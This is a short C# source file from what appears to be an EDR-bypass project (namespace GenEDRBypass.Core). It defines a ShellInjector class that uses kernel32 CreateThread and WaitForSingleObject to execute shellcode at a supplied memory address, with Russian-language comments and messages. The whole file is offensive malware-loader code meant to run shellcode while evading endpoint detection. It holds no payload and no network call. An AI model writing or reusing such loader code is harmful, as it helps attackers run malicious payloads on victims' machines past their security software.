using System;
using System.Runtime.InteropServices;

namespace GenEDRBypass.Core
{
    public static class ShellInjector
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // Инъекция шеллкода в память
        public static void InjectShellcode(IntPtr address)
        {
            Console.WriteLine("Создание потока для инъекции шеллкода...");

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
                throw new Exception("Не удалось создать поток инъекции.");

            WaitForSingleObject(hThread, 0xFFFFFFFF); // Ожидаем завершения потока
        }
    }
}
